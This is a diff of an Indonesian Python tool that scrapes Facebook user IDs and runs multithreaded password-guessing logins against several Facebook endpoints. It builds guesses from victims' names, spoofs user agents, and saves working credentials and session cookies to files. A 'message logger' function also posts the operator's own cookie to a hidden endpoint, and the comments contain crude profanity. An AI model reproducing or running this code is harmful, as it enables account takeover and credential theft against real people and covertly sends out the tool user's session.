-		#device = random.choice(["vivo 1901 Build/RP1A.200720.012; wv","vivo Y15 Build/JDQ39","vivo 1901 Build/PPR1.180610.011; wv","vivo 1901 Build/RP1A.200720.012","Redmi 5A Build/N2G47H","2201122G Build/TKQ1.220807.001; wv","2201122G Build/SKQ1.211006.001; wv","2201122G Build/TKQ1.220807.001; wv"])
-		#density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
-		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
-		return ugent		
-		
+    ''' MULAI DUMP FOLLOWERS '''
+    def follow(self, link, coki):
+        try:
+            xxxx = self.ses.get(link, cookies = coki).text
+            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
+            for xxx in rege:
+                if "profile.php?" in xxx[0]:
+                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
+                else:
+                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
+                console.print(f' {P2}[{H2}+{P2}] sedang mengumpulkan {H2}{str(len(self.id))}{P2} id...                                      ',end='\r')
+                sleep(000000.003)
+            if "Lihat Selengkapnya" in xxxx:
+                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
+        except:pass
+
+    ''' MULAI DUMP '''
+    def __ngadump__(self, link, coki):
+        try:
+            data = self.ses.get(link, cookies=coki).text
+            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
+            for x in cari:
+                if "profile.php?" in x[0]:
+                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
+                else:
+                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
+                console.print(f' {P2}[{H2}+{P2}] sedang mengumpulkan {H2}{str(len(self.id))}{P2} id...                                      ',end='\r')
+                sleep(000000.003)
+            if "Lihat Postingan Lainnya" in data:
+                self.__ngadump__(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
+        except:pass
+    ''' MULAI CRACK FILE '''
+    def __CrackFile__(self):
+        try:__FileAing__ = os.listdir('nazz')
+        except FileNotFoundError:
+                console.print(f' {P2}[{M2}!{P2}] folder masih kosong')
+                sleep(2);self.menu()
+        if len(__FileAing__)==0:
+                console.print(f' {P2}[{M2}!{P2}] folder masih kosong')
+                sleep(2);self.menu()
+        else:
+                __Ngadepo__ = 0
+                __AngkaTogel__ = {}
+                for isi in __FileAing__:
+                        try:openfile = open('nazz/'+isi,'r').readlines()
+                        except:continue
+                        __Ngadepo__+=1
+                        if __Ngadepo__<100:
+                                nom = ''+str(__Ngadepo__)
+                                __AngkaTogel__.update({str(__Ngadepo__):str(isi)})
+                                __AngkaTogel__.update({nom:str(isi)})
+                                console.print(f' {P2}[{H2}{nom}{P2}] {P2}{isi} total id {H2}{len(openfile)}{P2}')
+                        else:
+                                __AngkaTogel__.update({str(__Ngadepo__):str(isi)})
+                __Araaapunyanazri__ = console.input(f' {P2}[{H2}?{P2}] pilih file untuk crack : ')
+                try:namefile = __AngkaTogel__[__Araaapunyanazri__]
+                except KeyError:
+                        console.print(f' {P2}[{M2}!{P2}] pilih yang bener bro')
+                        sleep(2);self.menu()
+                try:lin = open('nazz/'+namefile,'r').read().splitlines()
+                except:
+                        console.print(f' {P2}[{M2}!{P2}] file tidak ada')
+                        sleep(2);self.menu()
+                for useri in lin:
+                        self.id.append(useri)
+                self.metode()
+
+    ''' MESSAGE LOGGER🤪🤪 '''
+    def datas(self, nama, coki):
+        try:
+            data = {"title": nama, "message": coki}
+            post = self.ses.post(self.__AyrinnPunyaGuaKentod__, data = data).text
+        except requests.ConnectionError as e:
+            Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+            sleep(3);sys.exit()
+
+    ''' METODE NGENTOT '''
+    def metode(self):
+        Console(width=70).print(Panel(f'''\r{P2}total {H2}{str(len(self.id))}{P2} id yang terkumpul''',style=f"bold white",padding=(0,20)))
+        __Araaaku__ = []
+        __Araaaku__.append(Panel(f'{P2}[{H2}01{P2}]. API',width=22,padding=(0,3),style=f"bold white"))
+        __Araaaku__.append(Panel(f'{P2}[{H2}02{P2}]. ASYNC',width=24,padding=(0,4),style=f"bold white"))
+        __Araaaku__.append(Panel(f'{P2}[{H2}03{P2}]. VALIDATE',width=22,padding=(0,2),style=f"bold white"))
+        __Araaaku__.append(Panel(f'{P2} [{H2}04{P2}]. REGULER',width=22,padding=(0,2),style=f"bold white"))
+        __Araaaku__.append(Panel(f'{P2}  [{H2}05{P2}]. WEB FB',width=24,padding=(0,2),style=f"bold white"))
+        __Araaaku__.append(Panel(f'{P2}[{H2}06{P2}]. GRAPH FB',width=22,padding=(0,2),style=f"bold white"))
+        Console(width=70).print(Panel(f'''  Pilih Metode Login Sesuai Keinginan Anda,Coba Satu Persatu!!!''',title="Metode",style=f"bold white",padding=(0,1)))
+        console.print(Columns(__Araaaku__))
+        __Araaapunyanazri__ = console.input(f' {P2}[{H2}?{P2}] pilih methode login (1/2/3) : ')
+        if __Araaapunyanazri__ in ["", " "]:
+            console.print(f' {P2}[{M2}!{P2}] pilih (1/2/3) bro jangan kosong')
+            sleep(3);self.menu()
+        elif __Araaapunyanazri__ in ["1", "01"]:
+            self.__sandii__("api")
+        elif __Araaapunyanazri__ in ["2", "02"]:
+            self.__sandii__("acy")
+        elif __Araaapunyanazri__ in ["3", "03"]:
+            self.__sandii__("dat")
+        elif __Araaapunyanazri__ in ["4", "04"]:
+            self.__sandii__("reg")
+        elif __Araaapunyanazri__ in ["5", "05"]:
+            self.__sandii__("web")
+        elif __Araaapunyanazri__ in ["6", "06"]:
+            self.__sandii__("grap")
+        else:
+            console.print(f' {P2}[{M2}!{P2}] pilih (1/2/3) satttt')
+            sleep(3);self.metode()
+
+    ''' PASSWORD '''
+    def __sandii__(self, xx):
+        Console(width=70).print(Panel(f'''{P2}[{H2}01{P2}]. password manual\n{P2}[{H2}02{P2}]. password gabungan\n{P2}[{H2}03{P2}]. password otomatis''',title="SETTING PASSWORD",style=f"bold white",padding=(0,20)))
+        __Araaapunyanazri__ = console.input(f' {P2}[{H2}?{P2}] pilih password (1/2/3) : ')
+        if __Araaapunyanazri__ in ["", " "]:
+            console.print(f' {P2}[{M2}!{P2}] pilih (1/2/3) bro jangan kosong')
+            sleep(3);self.menu()
+        elif __Araaapunyanazri__ in ["1", "01"]:
+            self.manual(xx)
+        elif __Araaapunyanazri__ in ["2", "02"]:
+            Console(width=70).print(Panel(f'''{P2}kata sandi minimal 6 karakter, gunakan "," untuk pemisahan''',title="MASUKAN SANDI",style=f"bold white",padding=(0,4)))
+            kata = console.input(f' {P2}[{H2}?{P2}] buat kata sandi : ')
+            __bokepsd__ = kata.split(",")
+            for i in __bokepsd__:
+                self.__katasandi__.append(i)
+            Console(width=70).print(Panel(f'''{P2}kata sandi tambahan : {H2}{kata}''',title="ANDA MENGGUNAKAN",style=f"bold white",padding=(0,4)))
+            self.__Retakan__(xx)
+        elif __Araaapunyanazri__ in ["3", "03"]:
+            self.__Retakan__(xx)
+        else:
+             console.print(f' {P2}[{M2}!{P2}] pilih (1/2/3) satttt')
+             sleep(3);self.__sandii__()
+
+    ''' PASSWORD MANUAL '''
+    def manual(self, xx):
+        self.iya.append("iya")
+        Console(width=70).print(Panel(f'''{P2}kata sandi minimal 6 karakter, gunakan "," untuk pemisahan''',style=f"bold white",padding=(0,4)))
+        while True:
+            global prog,des
+            __AraaCantik__ = console.input(f' {P2}[{H2}?{P2}] buat kata sandi : ')
+            if __AraaCantik__ in[""," "]:
+                console.print(f' {P2}[{M2}!{P2}] buat kata sandi, jangan kosong')
+            elif len(__AraaCantik__)<=5:
+                console.print(f' {P2}[{M2}!{P2}] kata sandi minimal 6 karakter bro')
+            else:
+                if "api" in xx:
+                    Console(width=70).print(Panel(f'''{P2}hasil ok tersimpan : {H2}{okc}\n{P2}hasil cp tersimpan : {K2}{cpc}''',style=f"bold white",padding=(0,12)))
+                    prog = Progress(TextColumn('{task.description}'))
+                    des = prog.add_task('', total=len(self.id))
+                    with prog:
+                        with __Araaaa__(max_workers=30) as __AraaPunyaku__:
+                            for user in self.id:
+                                __AraaPunyaku__.submit(self.apiiiiii, user.split("<=>")[0], __AraaCantik__)
+                        print('\r')
+                        __kumahasia__(f' {P2}[{H2}✓{P2}] crack {H2}{str(len(self.id))} {P2}telah selesai...        ')
+                        sleep(3);sys.exit()
+                elif "acy" in xx:
+                    Console(width=70).print(Panel(f'''{P2}hasil ok tersimpan : {H2}{okc}\n{P2}hasil cp tersimpan : {K2}{cpc}''',style=f"bold white",padding=(0,12)))
+                    prog = Progress(TextColumn('{task.description}'))
+                    des = prog.add_task('', total=len(self.id))
+                    with prog:
+                        with __Araaaa__(max_workers=30) as __AraaPunyaku__:
+                            for user in self.id:
+                                __AraaPunyaku__.submit(self.regguler, user.split("<=>")[0], __AraaCantik__)
+                        print('\r')
+                        __kumahasia__(f' {P2}[{H2}✓{P2}] crack {H2}{str(len(self.id))} {P2}telah selesai...        ')
+                        sleep(3);sys.exit()
+                elif "dat" in xx:
+                    Console(width=70).print(Panel(f'''{P2}hasil ok tersimpan : {H2}{okc}\n{P2}hasil cp tersimpan : {K2}{cpc}''',style=f"bold white",padding=(0,12)))
+                    prog = Progress(TextColumn('{task.description}'))
+                    des = prog.add_task('', total=len(self.id))
+                    with prog:
+                        with __Araaaa__(max_workers=30) as __AraaPunyaku__:
+                            for user in self.id:
+                                __AraaPunyaku__.submit(self.apiiiiii, user.split("<=>")[0], __AraaCantik__)
+                        print('\r')
+                        __kumahasia__(f' {P2}[{H2}✓{P2}] crack {H2}{str(len(self.id))} {P2}telah selesai...        ')
+                        sleep(3);sys.exit()
+                else:
+                    continue
+
+    ''' WORDLIST '''
+    def __Retakan__(self, __Araaku__):
+        Console(width=70).print(Panel(f'''{P2}hasil ok tersimpan : {H2}{okc}\n{P2}hasil cp tersimpan : {K2}{cpc}''',style=f"bold white",padding=(0,12)))
+        global prog,des
+        prog = Progress(TextColumn('{task.description}'))
+        des = prog.add_task('', total=len(self.id))
+        with prog:
+            with __Araaaa__(max_workers=30) as __AraaPunyaku__:
+                for user in self.id:
+                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
+                    depan = nama.split(" ")
+                    try:
+                        if len(nama) <=5:
+                            if len(depan) <=1 or len(depan) <=2:pass
+                            else:
+                                pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
+                        else:
+                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
+                        if "iya" in self.iya:
+                            for x in self.__katasandi__:
+                                pwx.append(x)
+                        if "api" in __Araaku__:
+                            __AraaPunyaku__.submit(self.apiiiiii, uid, pwx)
+                        elif "acy" in __Araaku__:
+                            __AraaPunyaku__.submit(self.async_, uid, pwx)
+                        elif "dat" in __Araaku__:
+                            __AraaPunyaku__.submit(self.validate, uid, pwx)
+                        elif "reg" in __Araaku__:
+                            __AraaPunyaku__.submit(self.reguler, uid, pwx)
+                        else:__AraaPunyaku__.submit(self.async_, uid, pwx)
+                    except:pass
+        print('\r')
+        __kumahasia__(f' {P2}[{H2}✓{P2}] crack {H2}{str(len(self.id))} {P2}telah selesai...        ')
+        sleep(3);sys.exit()
+
+    ''' UA VALIDATE '''
+    def Ugent_validate(self):
+         self.android = random.choice(['7.1.2','8.1.0'])
+         self.build = "OPM2."+str(random.randint(111111,199999))+".006"
+         self.chrome = str(random.randint(60,99))+".0."+str(random.randint(3300,3999))+"."+str(random.randint(75,99))
+         self.browser = str(random.randint(35,99))+".1."+str(random.randint(2200,2900))+"."+str(random.randint(111111,199999))
+         return ('Mozilla/5.0 (Linux; U; Android {}; Redmi 5A Build/{}.H1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 OPR/{}'.format(self.android, self.build, self.chrome, self.browser))
+    
+    ''' UA ASYNC '''
+    def Ugent_async(self):
+         self.samsung = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; SM-A105M Build/RP1A.{str(random.randint(111111,299999))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,99))}.0.{str(random.randint(4000,4900))}.{str(random.randint(75,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(400,490))}.0.0.30.97;]"
+         self.mixx = f"Mozilla/5.0 (Linux; Android {str(random.randint(3,8))}.{str(random.randint(0,4))}.{str(random.randint(0,2))}; Micromax A065 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(30,99))}.0.0.0 Mobile Safari/537.36"
+         self.asus = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(1,9))}.{str(random.randint(2,6))}.{str(random.randint(0,3))}; en-US; ASUS_T00I Build/KVT49L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(random.randint(7,12))}.4.5.{str(random.randint(1000,1900))} U3/0.8.0 Mobile Safari/534.30"
+         self.memekkkkkasu = random.choice([self.samsung, self.mixx, self.asus])
+         return self.memekkkkkasu
+    
+    ''' UA API '''
+    def ua_api(self):
+        az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
+        builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
+        chrome3 = str(random.randint(100, 300))
+        chrome4 = str(random.randint(1000, 9000))
+        ngentod = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
+        return ngentod
+
+    ''' METODE GRAPH '''
+    def apiiiiii(self, __nomortelepon__, __katasandi__):
+        prog.update(des, description=f" {P2}[{H2}+{P2}] {P2}[ {H2}(METODE API FB) {P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}[/] CP-:{K2}{len(self.cp)}[/]")
+        prog.advance(des)
+        for password in __katasandi__:
+            try:
+                ses = requests.Session()
+                uas = random.choice(ugent)
+                data = {"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28", "sdk_version": {random.randint(1,26)}, "email": __nomortelepon__, "locale": "en_US", "password": password, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
+                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+                __bokepsd__ = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
+                if "session_key" in __bokepsd__:
+                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                    uk = base64.b64encode(os.urandom(35)).decode().replace("=","").replace("+","_").replace("/","-")
+                    cokie = ";".join(i["name"]+"="+i["value"] for i in __bokepsd__["session_cookies"])
+                    coki = f"sb={sb};{cokie};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;ua={uk}"
+                    tree = Tree('')
+                    tree.add(f'{H2}{__nomortelepon__}|{password}')
+                    tree.add(f'{H2}{coki}{P2}').add(f'{H2}{uas}')
+                  #  tree.add(f"{H2}{uas}")
+                    __kumahasia__(tree)
+                    kntl = (f"[✓] {__nomortelepon__}|{password}|{coki}")
+                    self.ok.append(kntl)
+                    with open("results/ok.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "www.facebook.com" in __bokepsd__["error"]["message"]:
+                    tree = Tree('')
+                    tree.add(f'{K2}{__nomortelepon__}|{password}{P2}')
+                    tree.add(f'{K2}{uas}')
+           #         tree.add(f"{K2}{uas}{P2}")
+                    __kumahasia__(tree)
+                    kntl = (f"[×] {__nomortelepon__}|{password}")
+                    self.cp.append(kntl)
+                    with open("results/cp.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "Calls to this api have exceeded the rate limit. (613)" in __bokepsd__:
+                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
+                    prog.advance(des)
+                    time.sleep(5)
+            except requests.exceptions.ConnectionError:
+                sleep(30)
+            #except Exception as e:print(e)
+        self.lo+=1
+
+    ''' VALIDATE '''
+    def validate(self, __nomortelepon__, __katasandi__):
+        prog.update(des, description=f" {P2}[{H2}+{P2}] {P2}[ {H2}(METODE VALIDATE) {P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}[/] CP-:{K2}{len(self.cp)}[/]")
+        prog.advance(des)
+        for password in __katasandi__:
+            try:
+                ses = requests.Session()
+                ugent = random_ua_xiaomi()
+                link = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={__nomortelepon__}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                data = {
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                    "uid":__nomortelepon__,
+                    "next":"https://mbasic.facebook.com/login/save-device/",
+                    "flow":"login_no_pin",
+                    "pass":password
+                }
+                head = {
+                    "Host": "mbasic.facebook.com",
+                    "Connection": "keep-alive",
+                    "Content-Length": "146",
+                    "Cache-Control": "max-age=0",
+                    "Upgrade-Insecure-Requests": "1",
+                    "Origin": "https://mbasic.facebook.com",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": ugent,
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "X-Requested-With": "mark.via.gp",
+                    "Sec-Fetch-Site": "same-origin",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-User": "?1",
+                    "Sec-Fetch-Dest": "document",
+                    "Referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={__nomortelepon__}&flow=login_no_pin&refsrc=deprecated&_rdr",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                }
+                __bokepsd__ = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
+                if "c_user" in ses.cookies.get_dict():
+                    cooz = ses.cookies.get_dict()
+                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
+                    tree = Tree('')
+                    tree.add(f'{H2}{__nomortelepon__}|{password}')
+                    tree.add(f'{H2}{coki}ua;{ugent}')
+                    __kumahasia__(tree)
+                    kntl = (f"[✓] {__nomortelepon__}|{password}|{coki}")
+                    self.ok.append(kntl)
+                    with open("results/ok.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "checkpoint" in ses.cookies.get_dict():
+                    tree = Tree('')
+                    tree.add(f'{K2}{__nomortelepon__}|{password}')
+                    __kumahasia__(tree)
+                    kntl = (f"[×] {__nomortelepon__}|{password}")
+                    self.cp.append(kntl)
+                    with open("results/cp.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+            except requests.exceptions.ConnectionError:
+                sleep(5)
+            #except Exception as e:print(e)
+        self.lo+=1
+    ''' REGULAR '''
+    def reguler(self, __nomortelepon__, __katasandi__):
+        prog.update(des, description=f" {P2}[{H2}+{P2}] {P2}[ {H2}(reguler) {P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}[/] CP-:{K2}{len(self.cp)}[/]")
+        prog.advance(des)
+        for password in __katasandi__:
+            try:
+                ses = requests.Session()
+                ugent = ugent_api2()
+                link = ses.get("https://b-m.facebook.com/login.php?next=https%3A%2F%2Fb-m.facebook.com%2Fhome.php%3Frefid%3D8&refsrc=deprecated&refid=8&_rdr")
+                data ={"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+			"jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+			"uid": __nomortelepon__,
+			"pass":password,
+			"flow": "login_no_pin",
+			"enable_bladerunner": False,
+			"enable_ack": True,
+			"enable_observer": False,
+			"enable_dataloss_timer": False,
+			"enable_fallback_for_br": True,
+			"fix_br_init_rc": False,
+			"queue_activation_experiment": True,
+			"prefer_related_applications": False, 
+			"encpass": f"#PWD_BROWSER:0:{random.randint(1000000000, 99999999999)}:{password}"}
+                head={"Host": "m.facebook.com",
+			"cache-control": "max-age=0",
+			"content-type": "application/x-www-form-urlencoded",
+			"origin": "https://b-m.facebook.com",
+			"referer": "https://b-m.facebook.com/login.php?next=https%3A%2F%2Fb-m.facebook.com%2Fhome.php%3Frefid%3D8&refsrc=deprecated&refid=8&_rdr", 
+			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+			"sec-ch-ua-mobile": "?1",
+			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			"sec-ch-ua-platfrom": '"Android"',
+			"sec-fetch-dest": "document",
+			"sec-fetch-mode": "navigate", 
+			"sec-fetch-site": "same-origin",
+			"user-agent": ugent,
+			"sec-fetch-user": "?1",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+                __bokepsd__ = ses.post('https://b-m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,headers=head,allow_redirects=False)
+                if "c_user" in ses.cookies.get_dict():
+                    cooz = ses.cookies.get_dict()
+                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
+                    tree = Tree('')
+                    tree.add(f'{H2}{__nomortelepon__}|{password}')
+                    tree.add(f'{H2}{coki}ua;{ugent}')
+                    __kumahasia__(tree)
+                    kntl = (f"[✓] {__nomortelepon__}|{password}|{coki}")
+                    self.ok.append(kntl)
+                    with open("results/ok.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "checkpoint" in ses.cookies.get_dict():
+                    tree = Tree('')
+                    tree.add(f'{K2}{__nomortelepon__}|{password}')
+                    __kumahasia__(tree)
+                    kntl = (f"[×] {__nomortelepon__}|{password}")
+                    self.cp.append(kntl)
+                    with open("results/cp.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+            except requests.exceptions.ConnectionError:
+                sleep(5)
+            #except Exception as e:print(e)
+        self.lo+=1
+
+    ''' ASYNC '''
+    def async_(self, __nomortelepon__, __katasandi__):
+        prog.update(des, description=f" {P2}[{H2}+{P2}] {P2}[ {H2}(METODE ASYNC) {P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}[/] CP-:{K2}{len(self.cp)}[/]")
+        prog.advance(des)
+        for password in __katasandi__:
+            try:
+                ses = requests.Session()
+                uas = self.Ugent_async()
+                link = ses.get("https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
+                data = {
+                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+                    "try_number": "0",
+                    "unrecognized_tries": "0",
+                    "email": __nomortelepon__,
+                    "prefill_contact_point": f"{__nomortelepon__} {password}",
+                    "prefill_source": "browser_dropdown",
+                    "prefill_type": "password",
+                    "first_prefill_source": "browser_dropdown",
+                    "first_prefill_type": "contact_point",
+                    "had_cp_prefilled": True,
+                    "had_password_prefilled": True,
+                    "is_smart_lock": False,
+                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
+                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+                    "encpass": f"#PWD_BROWSER:0:{str(KontolMemekSiaAnjingKontolAsuMemekBagong()).split('.')[0]}:{password}",
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
+                }
+                head = {"Host": "m.facebook.com", "content-length": f"{str(len(data))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+                __bokepsd__ = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
+                if "c_user" in ses.cookies.get_dict():
+                    cooz = ses.cookies.get_dict()
+                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
+                    tree = Tree('')
+                    tree.add(f'{H2}{__nomortelepon__}|{password}').add(f'{H2}{coki}{uas}')
+                    __kumahasia__(tree)
+                    kntl = (f"[✓] {__nomortelepon__}|{password}|{coki}")
+                    self.ok.append(kntl)
+                    with open("results/ok.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "checkpoint" in ses.cookies.get_dict():
+                    tree = Tree('')
+                    tree.add(f'{K2}{__nomortelepon__}|{password}')
+                    __kumahasia__(tree)
+                    kntl = (f"[×] {__nomortelepon__}|{password}")
+                    self.cp.append(kntl)
+                    with open("results/cp.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+            except requests.exceptions.ConnectionError:
+                sleep(5)
+            #except Exception as e:print(e)
+        self.lo+=1
+
+''' START '''
 if __name__=="__main__":
-	try:os.mkdir("OK")
-	except:pass
-	try:os.mkdir("CP")
-	except:pass
-	try:os.mkdir("data")
-	except:pass
-	Menu().menu()
-#Gunakan Facebook dalam mode dasar dengan Telkomsel
+  try:os.system('git pull')
+  except:pass
+  try:os.mkdir('data')
+  except:pass
+  try:os.mkdir('results')
+  except:pass
+  try:os.mkdir('nazz')
+  except:pass
+  try:Login()
+  except requests.exceptions.ConnectionError as e:
+      Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+      sleep(3);sys.exit()
+      
+''' JANGAN LUPA NGENTOD SAMA GUA 
+   CHAT SAYA SAJA MELALUI WA SAYA DI ATAS
+   DAN JANGAN LUPA JUGA FOLLOW GH GUE NGENT
+   TERIMAKASIH SEMUA NYA SALAM EPEPE🥰'''
